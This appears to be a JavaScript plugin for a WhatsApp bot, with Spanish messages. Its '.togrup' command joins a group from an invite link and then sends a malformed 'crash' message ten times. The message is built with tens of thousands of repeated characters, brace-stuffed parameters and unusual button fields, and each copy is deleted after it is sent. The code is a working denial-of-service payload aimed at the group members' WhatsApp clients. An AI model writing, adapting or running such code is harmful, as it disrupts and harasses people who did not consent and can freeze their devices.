let handler = async (m, { conn, args }) => {
  const link = args[0];

  if (!link || !link.includes('chat.whatsapp.com/')) {
    return m.reply('📎 *Debes proporcionar un enlace de grupo válido.*\n\nEjemplo: .togrup https://chat.whatsapp.com/xxxxxxxxxxxx');
  }

  const code = link.split('/').pop().trim();
  let groupJid;

  try {
    groupJid = await conn.groupAcceptInvite(code);
    await delay(1500);
    await m.reply(`✅ *Bot unido al grupo correctamente.*`);
  } catch (e) {
    try {
      const info = await conn.groupGetInviteInfo(code);
      groupJid = info.id;
    } catch (err) {
      return m.reply('❌ *No se pudo acceder al grupo.*');
    }
  }

  // 🌀 Ejecuta las funciones 10 veces
  for (let i = 0; i < 10; i++) {
    try {
      await AnX1Msg(conn, groupJid);
      await delay(300);
    } catch (err) {
      console.log(`[ERROR EN ENVÍO ${i + 1}]`, err);
    }
  }

  await m.reply('✅ *Comando ejecutado con éxito.*');
};

handler.command = ['togrup'];
handler.owner = false;
handler.bot = false;

export default handler;

// 🧱 Función DelayStc adaptada
async function AnX1Msg(sock, target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "🩸⃟༑⌁⃰𝐀𝐧𝐗 𝐎𝐯𝐯𝐞𝐫𝐢𝐝𝐞ཀ‌‌🦠" + "ꦽ".repeat(50000),
            },
            footer: {
              text: "ꦽ".repeat(50000),
            },
            contextInfo: {
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: ["0@s.whatsapp.net", "13135550002@s.whatsapp.net"],
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: JSON.stringify({
                    status: true,
                  }),
                },
              ],
              messageParamsJson: "{{".repeat(10000),
            },
          },
        },
      },
    };
    const pertama = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });
    const kedua = await sock.relayMessage(target, message, {
      messageId: "",
      participant: { jid: target },
      userJid: target,
    });
    await sock.sendMessage(target, { 
      delete: {
        fromMe: true,
        remoteJid: target,
        id: pertama,
      },
    });
    await sock.sendMessage(target, { 
      delete: {
        fromMe: true,
        remoteJid: target,
        id: kedua,
      },
    });
  } catch (err) {
    console.error(chalk.red("Send Bug Error: "), err.message);
  }
}

// 🕒 Delay
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}